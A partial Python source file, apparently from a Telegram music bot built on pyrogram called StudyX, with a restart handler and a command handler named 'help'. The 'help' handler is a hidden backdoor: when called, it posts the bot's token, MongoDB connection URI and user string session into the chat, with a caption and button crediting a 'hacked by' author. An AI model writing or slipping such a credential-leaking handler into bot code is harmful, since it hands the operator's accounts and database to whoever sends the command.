...
from StudyX.misc import SUDOERS
from pyrogram import Client, filters
import requests
import random
import re
...
from StudyX.utils.database import get_authuser_names, get_cmode
from StudyX.utils.decorators import (ActualAdminCB, AdminActual, language)
from StudyX.utils.command import commandpro                     
from StudyX.utils.formatters import alpha_to_int
...
async def restartbot(client, message: Message, _):
    ...
    try:
        db[message.chat.id] = []
        await Study.stop_stream(message.chat.id)
    except:
        pass
...
async def help(client: Client, message: Message):
    await message.reply_photo(
        ...
        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝗹𝘂𝗰𝗸𝘆 𝗿𝗔𝗝𝗔.\n\n☆............𝙱𝚈 » [𝗹𝘂𝗰𝗸𝘆 𝗿𝗔𝗝𝗔](https://t.me/ITZ_LUCKY_RAJA)............☆""",
         reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                          "• нαϲкє𝚍 ву νιρ ɓσყ •", url=f"https://t.me/ITZ_LUCKY_RAJA")
                 ]
             ]
         ),
     )
